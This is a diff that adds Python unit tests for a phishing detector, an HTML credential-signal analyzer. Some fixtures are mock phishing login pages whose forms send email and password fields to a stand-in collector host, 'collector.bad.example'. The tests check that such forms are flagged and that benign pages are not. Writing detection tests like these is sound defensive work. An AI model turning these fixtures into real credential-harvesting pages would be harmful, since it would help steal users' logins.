@@ -1,0 +1,113 @@
+from app.application.ports.html_fetcher import FetchedHtmlDocument
+from app.application.services.html_credential_signal_analyzer import HtmlCredentialSignalAnalyzer
+from app.domain.enums.signal_type import SignalType
+from app.domain.value_objects.normalized_url import NormalizedUrl
+
+
+def test_html_credential_signal_analyzer_emits_signal_for_login_form() -> None:
+    analyzer = HtmlCredentialSignalAnalyzer()
+
+    signals = analyzer.analyze(
+        NormalizedUrl.from_raw("https://portal-example.test/login"),
+        FetchedHtmlDocument(
+            content="""
+            <html>
+              <body>
+                <h1>Verify your account</h1>
+                <form action="https://collector.bad.example/submit">
+                  <input type="email" name="email" />
+                  <input type="password" name="password" />
+                  <button type="submit">Sign in</button>
+                </form>
+              </body>
+            </html>
+            """,
+            source_url="https://portal-example.test/login",
+            content_type="text/html",
+        ),
+    )
+
+    assert len(signals) == 1
+    signal = signals[0]
+    assert signal.signal_type == SignalType.CREDENTIAL_HARVEST_FORM
+    assert "HTML forms found: 1." in signal.evidence
+    assert "Password fields found: 1." in signal.evidence
+    assert "Matched account input hints: email." in signal.evidence
+    assert "Matched login wording: account, sign in, verify." in signal.evidence
+    assert "Suspicious form action: https://collector.bad.example/submit." in signal.evidence
+
+
+def test_html_credential_signal_analyzer_skips_pages_without_login_patterns() -> None:
+    analyzer = HtmlCredentialSignalAnalyzer()
+
+    signals = analyzer.analyze(
+        NormalizedUrl.from_raw("https://portal-example.test/about"),
+        FetchedHtmlDocument(
+            content="""
+            <html>
+              <body>
+                <h1>About our company</h1>
+                <p>Read the latest platform updates and product news.</p>
+              </body>
+            </html>
+            """,
+            source_url="https://portal-example.test/about",
+            content_type="text/html",
+        ),
+    )
+
+    assert signals == []
+
+
+def test_html_credential_signal_analyzer_skips_generic_legitimate_login_surface() -> None:
+    analyzer = HtmlCredentialSignalAnalyzer()
+
+    signals = analyzer.analyze(
+        NormalizedUrl.from_raw("https://github.com"),
+        FetchedHtmlDocument(
+            content="""
+            <html>
+              <body>
+                <nav>
+                  <a href="/login">Sign in</a>
+                  <a href="/signup">Create account</a>
+                </nav>
+                <form action="/session">
+                  <input type="email" name="user_email" />
+                  <button type="submit">Sign in</button>
+                </form>
+              </body>
+            </html>
+            """,
+            source_url="https://github.com",
+            content_type="text/html",
+        ),
+    )
+
+    assert all(signal.signal_type != SignalType.SUSPICIOUS_LOGIN_INTERFACE for signal in signals)
+
+
+def test_html_credential_signal_analyzer_emits_signal_for_suspicious_login_ui() -> None:
+    analyzer = HtmlCredentialSignalAnalyzer()
+
+    signals = analyzer.analyze(
+        NormalizedUrl.from_raw("https://secure-login.bad-example.test/"),
+        FetchedHtmlDocument(
+            content="""
+            <html>
+              <body>
+                <h1>Verify account sign in</h1>
+                <form action="https://collector.bad.example/submit">
+                  <input type="email" name="email" />
+                  <button type="submit">Sign in</button>
+                </form>
+              </body>
+            </html>
+            """,
+            source_url="https://secure-login.bad-example.test/",
+            content_type="text/html",
+        ),
+    )
+
+    assert len(signals) == 1
+    assert signals[0].signal_type == SignalType.SUSPICIOUS_LOGIN_INTERFACE
